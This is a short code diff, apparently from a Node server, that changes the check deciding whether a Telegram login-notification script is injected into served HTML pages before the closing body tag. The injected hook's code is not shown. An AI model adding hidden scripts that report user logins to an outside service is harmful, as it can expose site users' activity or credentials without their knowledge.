@@ -420,7 +420,7 @@ function createServer() {
               return;
             }
             let modified = content;
-            if (!content.includes('/api/notify-login')) {
+            if (!content.includes('/api/notify-login') && !content.includes('telegram-notify.js')) {
               if (content.includes('</body>')) {
                 modified = content.replace('</body>', `${CLIENT_TELEGRAM_HOOK}\n</body>`);
               } else {
